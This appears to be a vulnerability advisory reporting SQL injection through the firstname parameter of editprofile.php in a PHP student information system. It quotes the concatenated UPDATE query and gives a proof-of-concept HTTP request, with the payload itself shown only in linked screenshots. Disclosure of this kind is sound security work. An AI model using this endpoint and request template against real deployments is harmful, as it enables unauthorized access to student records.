# Student Information System

## supplier 
https://code-projects.org/student-information-system-in-php-with-source-code-2/
## Vulnerability file
editprofile.php

## describe

**Code analysis**   

In the editprofile.php file of Student Information System, the firstname parameter is obtained, and the SQL statement is concatenated to the SQL statement without filtering the execution, resulting in SQL injection vulnerabilities and server permissions

Line 11-16 in editprofile.php

```php
    $fname = clean($_POST['firstname']);
    $lname = clean($_POST['lastname']);
    $course = clean($_POST['course']);
    $yrlevel = clean($_POST['yrlevel']);

    $query = "UPDATE students SET firstname = '$fname', lastname = '$lname', course = '$course', yrlevel = '$yrlevel'
    WHERE id='".$_SESSION['userid']."'";
```

## POC

```
POST /Stu/studentinfosystem/editprofile.php HTTP/1.1
Host: 127.0.0.1:8083
Content-Length: 73
Cache-Control: max-age=0
sec-ch-ua: 
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:8083
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8083/Stu/studentinfosystem/editprofile.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=pdtmrbifdaoihek22bub5ecasu
Connection: close

firstname=1&lastname=1&course=BSBA&yrlevel=1st+year&update=Update+Profile
```

**Result**
![image-2025](https://github.com/asd1238525/cve/blob/main/fff1357f835abfd13bdfd5899c730d34.png)
Get payload:
![image-2025](https://github.com/asd1238525/cve/blob/main/a9e95dd49a676c2a33e6a81e2f7a9ab1.png)